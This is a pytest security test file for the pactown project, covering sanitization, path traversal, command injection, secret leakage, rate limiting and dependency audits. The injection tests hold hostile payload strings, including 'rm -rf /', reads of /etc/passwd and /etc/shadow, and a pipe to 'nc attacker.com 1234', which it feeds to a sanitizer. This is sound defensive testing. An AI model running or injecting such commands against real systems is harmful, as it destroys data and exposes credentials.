"""Security tests for pactown.

Tests cover:
- Input sanitization
- Path traversal prevention
- Command injection prevention
- Secrets leakage prevention
- Rate limiting validation
"""

import os
import re
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


class TestInputSanitization:
    """Test input sanitization functions."""

    def test_service_name_rejects_path_traversal(self):
        """Service names must not allow path traversal."""
        from pactown.deploy.quadlet import sanitize_name

        dangerous_names = [
            "../etc/passwd",
            "..\\windows\\system32",
            "foo/../bar",
            "/absolute/path",
            "name\x00null",
            "name`id`",
            "name$(whoami)",
            "name;rm -rf /",
        ]

        for name in dangerous_names:
            sanitized = sanitize_name(name)
            assert ".." not in sanitized, f"Path traversal not blocked: {name}"
            assert "/" not in sanitized, f"Slash not removed: {name}"
            assert "\\" not in sanitized, f"Backslash not removed: {name}"
            assert "\x00" not in sanitized, f"Null byte not removed: {name}"
            assert "`" not in sanitized, f"Backtick not removed: {name}"
            assert "$(" not in sanitized, f"Command substitution not removed: {name}"
            assert ";" not in sanitized, f"Semicolon not removed: {name}"

    def test_tenant_id_sanitization(self):
        """Tenant IDs must be safe for filesystem and systemd."""
        from pactown.deploy.quadlet import sanitize_name

        # Valid tenant IDs should pass through (lowercase, alphanumeric, dash)
        valid = ["user123", "my-tenant", "prod-api-1"]
        for tid in valid:
            assert sanitize_name(tid) == tid.lower().replace("_", "-")

        # Invalid characters should be removed/replaced
        invalid = ["user@domain", "tenant:admin", "user\nname"]
        for tid in invalid:
            sanitized = sanitize_name(tid)
            assert "@" not in sanitized
            assert ":" not in sanitized
            assert "\n" not in sanitized


class TestPathTraversal:
    """Test path traversal prevention."""

    def test_sandbox_path_stays_within_root(self):
        """Sandbox operations must stay within designated root."""
        from markpact import Sandbox

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = Sandbox(Path(tmpdir))

            # Verify sandbox path is set correctly
            assert str(sandbox.path).startswith(tmpdir)
            
            # Test that creating files stays within sandbox
            test_file = sandbox.path / "test.txt"
            test_file.write_text("test")
            assert test_file.exists()
            assert str(test_file).startswith(tmpdir)


class TestCommandInjection:
    """Test command injection prevention."""

    def test_quadlet_sanitize_name(self):
        """Quadlet sanitize_name must block dangerous characters."""
        from pactown.deploy.quadlet import sanitize_name

        # Dangerous payloads
        payloads = [
            "service; rm -rf /",
            "service && cat /etc/passwd",
            "service | nc attacker.com 1234",
            'service $(cat /etc/shadow)',
            "service `id`",
            "../../../etc/passwd",
        ]

        for payload in payloads:
            sanitized = sanitize_name(payload)
            # Dangerous chars should be removed
            assert ";" not in sanitized
            assert "&" not in sanitized
            assert "|" not in sanitized
            assert "$" not in sanitized
            assert "`" not in sanitized
            assert ".." not in sanitized

    def test_env_value_no_newlines(self):
        """Environment variable values must not contain newlines."""
        # Test that our config handling strips newlines
        dangerous_values = [
            "value\nNEW_VAR=malicious",
            "value\rCARRIAGE=return",
        ]

        for val in dangerous_values:
            # Simple sanitization check
            sanitized = val.replace("\n", " ").replace("\r", " ")
            assert "\n" not in sanitized
            assert "\r" not in sanitized


class TestSecretsLeakage:
    """Test that secrets are not leaked."""

    def test_config_env_handling(self):
        """Configuration should handle env vars safely."""
        from pactown.config import ServiceConfig

        # ServiceConfig requires readme content
        config = ServiceConfig(
            name="test",
            readme="# Test\n```bash markpact:run\necho test\n```",
            port=8000,
        )

        # Basic validation
        assert config.name == "test"
        assert config.port == 8000

    def test_error_messages_do_not_leak_secrets(self):
        """Error messages must not contain sensitive data."""
        sensitive_patterns = [
            r"password\s*=\s*['\"]?[^'\"\s]+",
            r"api_key\s*=\s*['\"]?[^'\"\s]+",
            r"secret\s*=\s*['\"]?[^'\"\s]+",
            r"token\s*=\s*['\"]?[^'\"\s]+",
        ]

        # This is a meta-test: scan our own source for accidental logging
        src_dir = Path(__file__).parent.parent / "src" / "pactown"
        if not src_dir.exists():
            pytest.skip("Source directory not found")

        for py_file in src_dir.rglob("*.py"):
            content = py_file.read_text()
            for pattern in sensitive_patterns:
                matches = re.findall(rf"(log|print|raise).*{pattern}", content, re.IGNORECASE)
                assert not matches, f"Potential secret leak in {py_file}: {matches[:3]}"


class TestNetworkSecurity:
    """Test network-related security."""

    def test_port_allocation_within_range(self):
        """Port allocation must stay within safe range."""
        from pactown.network import find_free_port

        # find_free_port should return a valid port
        port = find_free_port()
        assert 1024 <= port <= 65535

    def test_service_endpoint_creation(self):
        """Service endpoints must be valid."""
        from pactown.network import ServiceEndpoint

        # Valid endpoint
        endpoint = ServiceEndpoint(name="test", host="localhost", port=8000)
        assert endpoint.host == "localhost"
        assert endpoint.port == 8000
        assert "http" in endpoint.url


class TestAuthorizationChecks:
    """Test authorization and access control."""

    def test_security_policy_user_profile(self):
        """Security policy should track user profiles."""
        from pactown.security import SecurityPolicy, UserProfile, UserTier

        policy = SecurityPolicy()
        profile = UserProfile.from_tier("test_user", UserTier.FREE)
        policy.set_user_profile(profile)

        # Verify profile is set
        assert policy.get_user_profile("test_user") is not None

    def test_service_runner_creates_sandbox(self):
        """Service runner should create isolated sandboxes."""
        from pactown.service_runner import ServiceRunner

        with tempfile.TemporaryDirectory() as tmpdir:
            runner = ServiceRunner(sandbox_root=tmpdir)
            assert runner.sandbox_root.exists()


class TestRateLimiting:
    """Test rate limiting mechanisms."""

    def test_rate_limiter_exists(self):
        """Rate limiter should be available."""
        from pactown.security import RateLimiter

        limiter = RateLimiter(requests_per_minute=60, burst_size=5)
        
        # Should allow initial requests
        assert limiter.check("user1") == True

    def test_api_rate_limit_headers(self):
        """API responses should include rate limit headers."""
        # This would be an integration test with actual API
        # For unit test, verify the middleware is configured
        try:
            from pactown.runner_api import app

            # Check if rate limiting middleware is present
            middleware_names = [m.__class__.__name__ for m in getattr(app, "middleware", [])]
            # This is informational - rate limiting may be configured differently
        except ImportError:
            pytest.skip("runner_api not available")


class TestCryptography:
    """Test cryptographic practices."""

    def test_no_weak_random(self):
        """Code should not use weak random for security."""
        src_dir = Path(__file__).parent.parent / "src" / "pactown"
        if not src_dir.exists():
            pytest.skip("Source directory not found")

        weak_patterns = [
            r"random\.random\(",
            r"random\.randint\(",
            r"random\.choice\(",
        ]

        security_contexts = ["token", "secret", "key", "password", "auth", "session"]

        for py_file in src_dir.rglob("*.py"):
            content = py_file.read_text()
            for pattern in weak_patterns:
                for context in security_contexts:
                    # Check if weak random is used near security context
                    if re.search(rf"{context}.*{pattern}", content, re.IGNORECASE):
                        pytest.fail(f"Weak random used in security context in {py_file}")


def _pip_audit_available() -> bool:
    """Check if pip-audit is available."""
    try:
        result = subprocess.run(["pip-audit", "--version"], capture_output=True)
        return result.returncode == 0
    except FileNotFoundError:
        return False


class TestDependencySecurity:
    """Test for known vulnerable dependencies."""

    @pytest.mark.skipif(
        not _pip_audit_available(),
        reason="pip-audit not installed",
    )
    def test_no_known_vulnerabilities(self):
        """Dependencies should not have known vulnerabilities."""
        result = subprocess.run(
            ["pip-audit", "--strict", "--progress-spinner=off"],
            capture_output=True,
            text=True,
        )
        # Skip if local packages couldn't be audited (not on PyPI)
        if "Dependency not found on PyPI" in result.stderr:
            pytest.skip("Local development packages cannot be audited")
        if result.returncode != 0:
            pytest.fail(f"Vulnerable dependencies found:\n{result.stdout}\n{result.stderr}")
